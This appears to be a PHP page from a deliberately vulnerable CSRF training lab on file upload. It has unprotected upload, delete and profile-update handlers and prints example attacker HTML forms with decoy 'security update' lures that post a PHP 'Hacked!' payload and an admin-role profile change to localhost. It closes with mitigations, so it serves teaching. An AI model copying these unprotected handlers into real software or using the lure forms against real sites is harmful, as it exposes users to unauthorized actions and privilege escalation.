<?php
// Lab 3: CSRF via File Upload
// Vulnerability: CSRF attacks through file upload functionality

session_start();

$message = '';
$uploaded_files = [];

// Initialize uploaded files if not exists
if (!isset($_SESSION['uploaded_files'])) {
    $_SESSION['uploaded_files'] = [];
}

$uploaded_files = $_SESSION['uploaded_files'];

// Handle file upload (vulnerable to CSRF)
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['upload_file'])) {
    $file_name = $_POST['file_name'] ?? '';
    $file_content = $_POST['file_content'] ?? '';
    $file_type = $_POST['file_type'] ?? 'text/plain';
    
    if ($file_name && $file_content) {
        $file_data = [
            'name' => $file_name,
            'content' => $file_content,
            'type' => $file_type,
            'size' => strlen($file_content),
            'uploaded_at' => date('Y-m-d H:i:s')
        ];
        
        $_SESSION['uploaded_files'][] = $file_data;
        $uploaded_files = $_SESSION['uploaded_files'];
        $message = '<div class="alert alert-success">File uploaded successfully!</div>';
    } else {
        $message = '<div class="alert alert-danger">Please provide both file name and content!</div>';
    }
}

// Handle file deletion (vulnerable to CSRF)
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['delete_file'])) {
    $file_index = (int)($_POST['file_index'] ?? -1);
    
    if ($file_index >= 0 && $file_index < count($uploaded_files)) {
        unset($_SESSION['uploaded_files'][$file_index]);
        $_SESSION['uploaded_files'] = array_values($_SESSION['uploaded_files']);
        $uploaded_files = $_SESSION['uploaded_files'];
        $message = '<div class="alert alert-success">File deleted successfully!</div>';
    } else {
        $message = '<div class="alert alert-danger">Invalid file index!</div>';
    }
}

// Handle malicious file upload (vulnerable to CSRF)
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['upload_malicious'])) {
    $malicious_content = $_POST['malicious_content'] ?? '';
    
    if ($malicious_content) {
        $file_data = [
            'name' => 'malicious_file.php',
            'content' => $malicious_content,
            'type' => 'application/x-php',
            'size' => strlen($malicious_content),
            'uploaded_at' => date('Y-m-d H:i:s')
        ];
        
        $_SESSION['uploaded_files'][] = $file_data;
        $uploaded_files = $_SESSION['uploaded_files'];
        $message = '<div class="alert alert-success">Malicious file uploaded successfully!</div>';
    }
}

// Handle profile update via file upload (vulnerable to CSRF)
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['update_via_file'])) {
    $profile_data = $_POST['profile_data'] ?? '';
    
    if ($profile_data) {
        // Parse profile data from file content
        $lines = explode("\n", $profile_data);
        $new_profile = [];
        
        foreach ($lines as $line) {
            if (strpos($line, '=') !== false) {
                list($key, $value) = explode('=', $line, 2);
                $new_profile[trim($key)] = trim($value);
            }
        }
        
        if (!empty($new_profile)) {
            $_SESSION['user_profile'] = array_merge($_SESSION['user_profile'] ?? [], $new_profile);
            $message = '<div class="alert alert-success">Profile updated via file upload!</div>';
        }
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lab 3: CSRF via File Upload - CSRF Labs</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.9.1/font/bootstrap-icons.css">
    
    <style>
        :root {
            --primary-dark: #1a1f36;
            --accent-green: #48bb78;
            --accent-blue: #4299e1;
            --accent-orange: #ed8936;
            --accent-red: #f56565;
        }
        
        body {
            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
            color: #e2e8f0;
            min-height: 100vh;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        .navbar-brand {
            font-weight: 700;
            font-size: 1.5rem;
            color: var(--accent-green) !important;
        }

        .nav-link {
            font-weight: 500;
            transition: color 0.3s;
        }

        .nav-link:hover {
            color: var(--accent-green) !important;
        }

        .hero-section {
            background: linear-gradient(rgba(15, 23, 42, 0.9), rgba(15, 23, 42, 0.9)), 
                        url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><rect width="100" height="100" fill="%231e293b"/><path d="M0 0L100 100M100 0L0 100" stroke="%23374151" stroke-width="1"/></svg>');
            padding: 2rem 0;
            border-bottom: 1px solid #2d3748;
            margin-bottom: 2rem;
        }

        .hero-title {
            font-size: 2rem;
            font-weight: 700;
            background: linear-gradient(90deg, #48bb78, #4299e1);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 0.5rem;
        }

        .hero-subtitle {
            font-size: 1rem;
            color: #cbd5e0;
        }

        .section-title {
            margin-top: 30px;
            margin-bottom: 20px;
            font-weight: 700;
            font-size: 1.5rem;
            position: relative;
            padding-bottom: 10px;
        }

        .section-title::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            width: 60px;
            height: 4px;
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            border-radius: 2px;
        }

        .card {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            color: #e2e8f0;
        }

        .card-header {
            background: rgba(15, 23, 42, 0.5);
            border-bottom: 1px solid #334155;
            font-weight: 600;
            padding: 1rem 1.5rem;
        }

        .form-control, .form-select {
            background: rgba(30, 41, 59, 0.7);
            border: 1px solid #334155;
            color: #e2e8f0;
            padding: 0.75rem 1rem;
        }

        .form-control:focus, .form-select:focus {
            background: rgba(30, 41, 59, 0.9);
            border-color: var(--accent-green);
            box-shadow: 0 0 0 0.2rem rgba(72, 187, 120, 0.25);
            color: #e2e8f0;
        }

        .form-label {
            font-weight: 500;
            color: #cbd5e0;
        }

        .btn-primary {
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            border: none;
            padding: 0.75rem 1.5rem;
            font-weight: 600;
            transition: all 0.3s;
        }

        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(72, 187, 120, 0.3);
        }

        .vulnerability-info {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-orange);
        }

        .payload-examples {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-blue);
        }

        .danger-zone {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-red);
        }

        pre {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            color: #e2e8f0;
            border: 1px solid #334155;
            overflow-x: auto;
        }

        .lab-info {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
        }

        .lab-badge {
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            color: #1a202c;
            font-weight: 600;
            padding: 0.5rem 1rem;
            border-radius: 6px;
            display: inline-block;
            margin-bottom: 1rem;
        }

        .file-display {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            margin: 1rem 0;
            border-left: 4px solid var(--accent-green);
        }

        .test-urls {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin-bottom: 1rem;
            border-left: 4px solid var(--accent-blue);
        }

        .file-info {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
        }

        .sensitive-data {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-red);
        }

        .code-block {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-blue);
            font-family: 'Courier New', monospace;
            white-space: pre-wrap;
        }
    </style>
</head>
<body>
    <nav class="navbar navbar-expand-md navbar-dark sticky-top" style="background-color: var(--primary-dark);">
        <div class="container-fluid">
            <a class="navbar-brand" href="index.php">
                <i class="bi bi-arrow-left me-2"></i>Back to CSRF Labs
            </a>
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse"
                data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false"
                aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>

            <div class="collapse navbar-collapse" id="navbarSupportedContent">
                <ul class="navbar-nav me-auto mb-2 mb-lg-0">
                    <li class="nav-item">
                        <a class="nav-link active" href="../about">About</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link active" href="../contact">Contact Us</a>
                    </li>
                </ul>
            </div>
        </div>
    </nav>

    <div class="hero-section">
        <div class="container">
            <h1 class="hero-title">Lab 3: CSRF via File Upload</h1>
            <p class="hero-subtitle">CSRF attacks through file upload functionality</p>
        </div>
    </div>

    <div class="container mb-5">
        <div class="lab-info">
            <span class="lab-badge">Difficulty: Medium</span>
            <h3 class="section-title">Lab Overview</h3>
            <p>This lab demonstrates CSRF vulnerabilities that can be exploited through file upload functionality. Attackers can trick users into uploading malicious files or perform unauthorized actions through file upload forms.</p>
            <p><strong>Objective:</strong> Use file upload functionality to perform CSRF attacks and upload malicious content.</p>
        </div>

        <div class="row">
            <div class="col-lg-6">
                <div class="card mb-4">
                    <div class="card-header text-center">
                        <i class="bi bi-code-slash me-2"></i>Vulnerable Code
                    </div>
                    <div class="card-body">
                        <pre>
// Vulnerable: No CSRF protection on file upload
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['upload_file'])) {
    $file_name = $_POST['file_name'] ?? '';
    $file_content = $_POST['file_content'] ?? '';
    
    // Process file upload without CSRF validation
    $_SESSION['uploaded_files'][] = [
        'name' => $file_name,
        'content' => $file_content,
        'uploaded_at' => date('Y-m-d H:i:s')
    ];
}

// Vulnerable: Malicious file upload
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['upload_malicious'])) {
    $malicious_content = $_POST['malicious_content'] ?? '';
    // Upload malicious content without validation
    $_SESSION['uploaded_files'][] = [
        'name' => 'malicious_file.php',
        'content' => $malicious_content,
        'type' => 'application/x-php'
    ];
}</pre>
                    </div>
                </div>
            </div>
            
            <div class="col-lg-6">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-upload me-2"></i>File Upload Status
                    </div>
                    <div class="card-body">
                        <?php echo $message; ?>
                        
                        <div class="file-info">
                            <h5>Uploaded Files (<?php echo count($uploaded_files); ?>)</h5>
                            <?php if (empty($uploaded_files)): ?>
                                <p class="text-muted">No files uploaded yet.</p>
                            <?php else: ?>
                                <?php foreach ($uploaded_files as $index => $file): ?>
                                    <div class="file-info">
                                        <p><strong>File <?php echo $index + 1; ?>:</strong> <?php echo htmlspecialchars($file['name']); ?></p>
                                        <p><strong>Type:</strong> <?php echo htmlspecialchars($file['type']); ?></p>
                                        <p><strong>Size:</strong> <?php echo number_format($file['size']); ?> bytes</p>
                                        <p><strong>Uploaded:</strong> <?php echo htmlspecialchars($file['uploaded_at']); ?></p>
                                        <form method="POST" class="d-inline">
                                            <input type="hidden" name="delete_file" value="1">
                                            <input type="hidden" name="file_index" value="<?php echo $index; ?>">
                                            <button type="submit" class="btn btn-sm btn-danger">Delete</button>
                                        </form>
                                    </div>
                                <?php endforeach; ?>
                            <?php endif; ?>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="row mt-4">
            <div class="col-md-6">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-upload me-2"></i>File Upload
                    </div>
                    <div class="card-body">
                        <form method="POST">
                            <input type="hidden" name="upload_file" value="1">
                            <div class="mb-3">
                                <label for="file_name" class="form-label">File Name</label>
                                <input type="text" class="form-control" id="file_name" name="file_name" 
                                       placeholder="Enter file name...">
                            </div>
                            <div class="mb-3">
                                <label for="file_type" class="form-label">File Type</label>
                                <select class="form-select" id="file_type" name="file_type">
                                    <option value="text/plain">Text File</option>
                                    <option value="application/x-php">PHP File</option>
                                    <option value="text/html">HTML File</option>
                                    <option value="application/javascript">JavaScript File</option>
                                </select>
                            </div>
                            <div class="mb-3">
                                <label for="file_content" class="form-label">File Content</label>
                                <textarea class="form-control" id="file_content" name="file_content" 
                                          rows="4" placeholder="Enter file content..."></textarea>
                            </div>
                            <button type="submit" class="btn btn-primary">Upload File</button>
                        </form>
                    </div>
                </div>
            </div>
            
            <div class="col-md-6">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-bug me-2"></i>Malicious File Upload
                    </div>
                    <div class="card-body">
                        <form method="POST">
                            <input type="hidden" name="upload_malicious" value="1">
                            <div class="mb-3">
                                <label for="malicious_content" class="form-label">Malicious Content</label>
                                <textarea class="form-control" id="malicious_content" name="malicious_content" 
                                          rows="4" placeholder="Enter malicious content...">&lt;?php
// Malicious PHP code
echo "Hacked!";
?&gt;</textarea>
                            </div>
                            <button type="submit" class="btn btn-primary">Upload Malicious File</button>
                        </form>
                    </div>
                </div>
            </div>
        </div>

        <div class="row mt-4">
            <div class="col-12">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-person-gear me-2"></i>Profile Update via File Upload
                    </div>
                    <div class="card-body">
                        <form method="POST">
                            <input type="hidden" name="update_via_file" value="1">
                            <div class="mb-3">
                                <label for="profile_data" class="form-label">Profile Data (Key=Value format)</label>
                                <textarea class="form-control" id="profile_data" name="profile_data" 
                                          rows="4" placeholder="Enter profile data in key=value format...">username=hacked_user
email=hacker@evil.com
role=admin
balance=999999</textarea>
                            </div>
                            <button type="submit" class="btn btn-primary">Update Profile via File</button>
                        </form>
                    </div>
                </div>
            </div>
        </div>

        <div class="row mt-4">
            <div class="col-md-6">
                <div class="vulnerability-info">
                    <h5><i class="bi bi-bug me-2"></i>Vulnerability Details</h5>
                    <ul>
                        <li><strong>Type:</strong> CSRF via File Upload</li>
                        <li><strong>Severity:</strong> High</li>
                        <li><strong>Method:</strong> POST</li>
                        <li><strong>Issue:</strong> No CSRF protection on file upload functionality</li>
                    </ul>
                </div>
            </div>
            
            <div class="col-md-6">
                <div class="payload-examples">
                    <h5><i class="bi bi-target me-2"></i>CSRF Attack Examples</h5>
                    <ul>
                        <li><code>file_upload_csrf.html</code> - Basic file upload attack</li>
                        <li><code>malicious_upload_csrf.html</code> - Malicious file upload</li>
                        <li><code>profile_update_csrf.html</code> - Profile update via file</li>
                    </ul>
                </div>
            </div>
        </div>

        <div class="test-urls">
            <h5><i class="bi bi-link me-2"></i>CSRF Attack Payloads</h5>
            <p>Create these malicious HTML files to test CSRF attacks:</p>
            
            <h6>1. File Upload CSRF (file_upload_csrf.html):</h6>
            <div class="code-block">&lt;html&gt;
&lt;body&gt;
    &lt;h1&gt;Upload your document here!&lt;/h1&gt;
    &lt;form action="http://localhost/test/csrf/3.php" method="POST"&gt;
        &lt;input type="hidden" name="upload_file" value="1"&gt;
        &lt;input type="hidden" name="file_name" value="malicious.txt"&gt;
        &lt;input type="hidden" name="file_type" value="text/plain"&gt;
        &lt;input type="hidden" name="file_content" value="This is a malicious file uploaded via CSRF!"&gt;
        &lt;input type="submit" value="Upload Document"&gt;
    &lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;</div>

            <h6>2. Malicious File Upload CSRF (malicious_upload_csrf.html):</h6>
            <div class="code-block">&lt;html&gt;
&lt;body&gt;
    &lt;h1&gt;Security update required!&lt;/h1&gt;
    &lt;form action="http://localhost/test/csrf/3.php" method="POST"&gt;
        &lt;input type="hidden" name="upload_malicious" value="1"&gt;
        &lt;input type="hidden" name="malicious_content" value="&lt;?php echo 'Hacked!'; ?&gt;"&gt;
        &lt;input type="submit" value="Install Security Update"&gt;
    &lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;</div>

            <h6>3. Profile Update via File CSRF (profile_update_csrf.html):</h6>
            <div class="code-block">&lt;html&gt;
&lt;body&gt;
    &lt;h1&gt;Profile backup required!&lt;/h1&gt;
    &lt;form action="http://localhost/test/csrf/3.php" method="POST"&gt;
        &lt;input type="hidden" name="update_via_file" value="1"&gt;
        &lt;input type="hidden" name="profile_data" value="username=hacked_user
email=hacker@evil.com
role=admin
balance=999999"&gt;
        &lt;input type="submit" value="Backup Profile"&gt;
    &lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;</div>
        </div>

        <div class="danger-zone">
            <h5><i class="bi bi-exclamation-triangle me-2"></i>Real-World Attack Scenarios</h5>
            <ul>
                <li>Upload malicious files and execute arbitrary code</li>
                <li>Upload files that modify application behavior</li>
                <li>Upload files that contain sensitive information</li>
                <li>Upload files that bypass security controls</li>
                <li>Upload files that perform unauthorized actions</li>
                <li>Compliance violations and security breaches</li>
            </ul>
        </div>

        <div class="card mt-4">
            <div class="card-header">
                <i class="bi bi-lightbulb me-2"></i>Mitigation Strategies
            </div>
            <div class="card-body">
                <ul>
                    <li>Implement CSRF tokens for all file upload operations</li>
                    <li>Validate file types and content before processing</li>
                    <li>Use secure file upload handling and storage</li>
                    <li>Implement proper file access controls and permissions</li>
                    <li>Use SameSite cookie attributes</li>
                    <li>Regular security testing and vulnerability assessments</li>
                    <li>Monitor for unusual file upload patterns and anomalies</li>
                </ul>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
